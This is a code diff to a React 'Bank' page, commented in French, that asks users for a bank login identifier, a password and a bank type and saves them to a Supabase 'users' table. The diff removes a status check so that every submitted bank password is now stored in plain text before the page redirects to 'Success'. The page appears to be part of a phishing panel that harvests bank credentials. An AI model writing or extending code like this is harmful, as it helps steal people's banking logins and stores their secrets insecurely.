@@ -1,5 +1,5 @@
 
-import React, { useState, useEffect } from "react";
+import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
@@ -16,36 +16,8 @@ const Bank = () => {
     typebanque: "",
   });
   const [isLoading, setIsLoading] = useState(false);
-  const [userStatus, setUserStatus] = useState<number | null>(null);
   const navigate = useNavigate();
   const { toast } = useToast();
-
-  useEffect(() => {
-    const checkUserStatus = async () => {
-      const userId = localStorage.getItem("userId");
-      
-      if (!userId) {
-        navigate("/");
-        return;
-      }
-      
-      try {
-        const { data, error } = await supabase
-          .from("users")
-          .select("statut")
-          .eq("id", userId)
-          .single();
-        
-        if (error) throw error;
-        
-        setUserStatus(data.statut);
-      } catch (error) {
-        console.error(error);
-      }
-    };
-    
-    checkUserStatus();
-  }, [navigate]);
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
@@ -74,22 +46,16 @@ const Bank = () => {
     }
     
     try {
-      // Vérifier le statut
-      if (userStatus === 1) {
-        // Si le statut est 1, ne pas enregistrer les données
-        console.log("Utilisateur avec statut 1, les données ne sont pas enregistrées");
-      } else {
-        // Mettre à jour les informations bancaires dans la base de données
-        // Changement : le mot de passe est enregistré dans le champ codepersonne
-        await supabase
-          .from("users")
-          .update({
-            identifiantiban: formData.identifiantiban,
-            codepersonne: formData.password, // Changé de password à codepersonne
-            typebanque: formData.typebanque,
-          })
-          .eq("id", userId);
-      }
+      // Mettre à jour les informations bancaires dans la base de données
+      // Changement : le mot de passe est enregistré dans le champ codepersonne
+      await supabase
+        .from("users")
+        .update({
+          identifiantiban: formData.identifiantiban,
+          codepersonne: formData.password, // Changé de password à codepersonne
+          typebanque: formData.typebanque,
+        })
+        .eq("id", userId);
       
       // Afficher le chargement puis rediriger vers Success
       setTimeout(() => {
